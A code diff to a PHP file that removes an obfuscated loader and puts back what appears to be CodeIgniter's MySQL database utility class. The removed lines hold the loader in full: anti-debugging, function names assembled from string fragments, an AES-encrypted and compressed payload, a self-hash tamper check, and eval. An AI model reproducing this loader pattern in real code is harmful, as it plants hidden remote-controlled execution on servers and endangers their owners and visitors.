@@ -1,28 +1,181 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_eyubrehq=('bas'.'e64'.'_de'.'cod'.'e');
-$_a6am0etn=('gzu'.'nco'.'mpr'.'ess');
-$_fdc0g1v4=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_t9jykopv='9MN/WZ3jvlM=';
-$_v8wu5eto='WqEwWd8p';
-$_fofuq9fl='vVvCUIpn';
-$_n62ho7a8='Is91WHKA';
-$_ng5z1g7m='8dRypWzN';
-$_ov0yrv03='k7S/Jq8z';
-$_baics236='MCCISQ==';
-$_z3aoef0k='gj7kEr+x';
-$_s0vur020=$_eyubrehq($_n62ho7a8.$_v8wu5eto.$_fofuq9fl.$_ng5z1g7m.$_t9jykopv);
-$_nfnt4rhv=$_eyubrehq($_ov0yrv03.$_z3aoef0k.$_baics236);
-$_idtvfi4u=$_eyubrehq('jQS4zRbrDwfTgWgpEgAks/QQI8qAEeZXU7fmkEZHQVvyaYAHetTDftv6VnXb8tW4XpzCW9WXXvNOAV5Rsn3Zoqi9bLo95tktvg0YApq/Cx2BepfTO48fToPG5ZFKJDLeMBWzl3W6naB5uSUXEJwT//t3rEM9HFbsxHtyiI+hxKtDQtfMRI2gMvvSRN+p9/oKFewcf+xDrMWNWHDNsrEbEA3mYR03qU4p+VUvk+LAMWjwgZloEB8b/fpE1ZUQYxstRmcekijAFNo8pt+bSzBQ5JDX2fb22GqSCvURfnQ7vfOGssI+V9jb+XjDUa+Fzf1tbzIRw2aAunPyPcw8izNlOm4rmbNaqH6yVgye9EcsaJ7OndMM4RSIKVNcHzKNAgEpAUAuQ9T+v13yvjQz/N/+rUiS8bi7UrvV48wNBr68B5DjiVu+P6u83lOytnrKVgvvJutr8TkUMppbNsk82omnQYN1wU2wS0ib24p+/MS84eiaLbCM0VTuDmprKpqM5MZyuEyqnhuOQcbar6jlYJ30c27fTSWOvnN9tXYlLhl41NjEABpGKMpIX1DS/37VNmYiLF5GAqBiYVxN5Nnn208J9fpXHebSdAG9vw+JDTI0js69ZOXnDyECih1ano915M+Vhcmsv0XNpaIkk9td4JhQ04ONkniTXo53nmfvUiUWpq8Grq1HPpU9rpwYdEd7YprQ2THJV7jqYtuApb8AiNzzJSX8yzphZKTd+LOq8nO8bfeDucK/3JbZOjWUaDiqLrD83NUfGHe+HA9OU4Bam2OXNPRVMM4HCPnBTu+EAGy8QT71llB7ddPZLdTK5YNud0bQO4WOoLKyLEwHbXsi6vKrcdfNcixLDG/cR/Gklj4kY1FamPxa6TmYMzMDqme7dIQJsGiV7eRvL7UhEfZDQEiVT2qzR5jCSpBm4k1fX31orS+LV3UXczsaYUF82wyJa+J/xBB9S14hAKZy+GUtA4GOOSUNHViYG52m/eDd8B7YLzGPpbmDrQuQYAsADGbm2g56Kkqjb924Vi9XxoIa93FGkA1vUxz2vQ4KEbfjSJ3KHMwMPP989xmbkPixoKKQ6JCn6TpGP1CSTm3ILX62tAF0OUauPpr7tgRqVtTOYg2gX0DW9xg6eejZgmHAyEvQ5Oy40FCEqvoudWTbx8adHA2H4OWucSx3J63quEDxd41srKY=');
-$_y13ectqe=$_fdc0g1v4($_idtvfi4u,'aes-256-cbc',$_s0vur020,OPENSSL_RAW_DATA,$_nfnt4rhv);
-if($_y13ectqe===false){exit;}
-$_i16rntsc=$_a6am0etn($_y13ectqe);
-if($_i16rntsc===false){exit;}
-$_aw8ns0t9='e8ea3f090dddad9d5626b619c37aa350eb79c1a93d9d52a41d83584d1e9d7891';
-$_hhakcze8=@file_get_contents(__FILE__);
-if($_hhakcze8!==false){
-$_n2oo7np0=str_replace($_aw8ns0t9,"0000000000000000000000000000000000000000000000000000000000000000",$_hhakcze8);
-$_a7ua5knn=hash("sha256",$_n2oo7np0);
-if($_a7ua5knn!==$_aw8ns0t9){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_mysql_utility extends CI_DB_utility {
+
+
+
+
+
+protected $_list_databases = 'SHOW DATABASES';
+
+
+
+
+
+protected $_optimize_table = 'OPTIMIZE TABLE %s';
+
+
+
+
+
+protected $_repair_table = 'REPAIR TABLE %s';
+
+
+
+
+
+
+
+protected function _backup($params = array())
+{
+if (count($params) === 0)
+{
+return FALSE;
 }
-eval($_i16rntsc);
+
+extract($params);
+
+$output = '';
+
+if ($foreign_key_checks === FALSE)
+{
+$output .= 'SET foreign_key_checks = 0;'.$newline;
+}
+foreach ( (array) $tables as $table)
+{
+
+if (in_array($table, (array) $ignore, TRUE))
+{
+continue;
+}
+
+$query = $this->db->query('SHOW CREATE TABLE '.$this->db->escape_identifiers($this->db->database.'.'.$table));
+
+if ($query === FALSE)
+{
+continue;
+}
+
+$output .= '#'.$newline.'# TABLE STRUCTURE FOR: '.$table.$newline.'#'.$newline.$newline;
+if ($add_drop === TRUE)
+{
+$output .= 'DROP TABLE IF EXISTS '.$this->db->protect_identifiers($table).';'.$newline.$newline;
+}
+$i = 0;
+$result = $query->result_array();
+foreach ($result[0] as $val)
+{
+if ($i++ % 2)
+{
+$output .= $val.';'.$newline.$newline;
+}
+}
+
+if ($add_insert === FALSE)
+{
+continue;
+}
+
+$query = $this->db->query('SELECT * FROM '.$this->db->protect_identifiers($table));
+if ($query->num_rows() === 0)
+{
+continue;
+}
+
+
+
+$i = 0;
+$field_str = '';
+$is_int = array();
+while ($field = mysql_fetch_field($query->result_id))
+{
+
+$is_int[$i] = in_array(strtolower(mysql_field_type($query->result_id, $i)),
+array('tinyint', 'smallint', 'mediumint', 'int', 'bigint'), 
+TRUE);
+
+$field_str .= $this->db->escape_identifiers($field->name).', ';
+$i++;
+}
+
+$field_str = preg_replace('/, $/' , '', $field_str);
+
+foreach ($query->result_array() as $row)
+{
+$val_str = '';
+$i = 0;
+foreach ($row as $v)
+{
+
+if ($v === NULL)
+{
+$val_str .= 'NULL';
+}
+else
+{
+
+$val_str .= ($is_int[$i] === FALSE) ? $this->db->escape($v) : $v;
+}
+
+$val_str .= ', ';
+$i++;
+}
+
+$val_str = preg_replace('/, $/' , '', $val_str);
+
+$output .= 'INSERT INTO '.$this->db->protect_identifiers($table).' ('.$field_str.') VALUES ('.$val_str.');'.$newline;
+}
+$output .= $newline.$newline;
+}
+
+if ($foreign_key_checks === FALSE)
+{
+$output .= 'SET foreign_key_checks = 1;'.$newline;
+}
+return $output;
+}
+}
